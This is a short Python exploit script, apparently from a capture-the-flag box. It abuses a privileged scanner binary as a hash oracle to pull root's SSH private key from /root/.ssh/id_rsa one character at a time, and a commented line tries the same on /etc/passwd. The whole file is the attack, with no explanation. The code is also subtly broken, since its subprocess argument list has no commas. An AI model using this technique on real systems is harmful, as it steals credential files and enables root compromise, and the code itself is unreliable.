import subprocess
import hashlib
import string

charset = string.ascii_letters + string.digits + "-+/=\n"

def brute(file,value):
    hash = hashlib.md5(value.encode()).hexdigest()
    result = subprocess.run(['/opt/scanner/scanner' '-c' file '-l' str(len(value)) '-s' hash], stdout=subprocess.PIPE)
    if len(result.stdout) > 0:
        return True
    return False

#print(brute('/etc/passwd','r'))

LOOP = True
guess = "-----BEGIN OPENSSH PRIVATE KEY-----\n"

while LOOP:
    for c in charset:
        if brute("/root/.ssh/id_rsa", guess + c):
            guess += c
            print(c, end="", flush=True)
            break
        if c == "\n":
            LOOP=False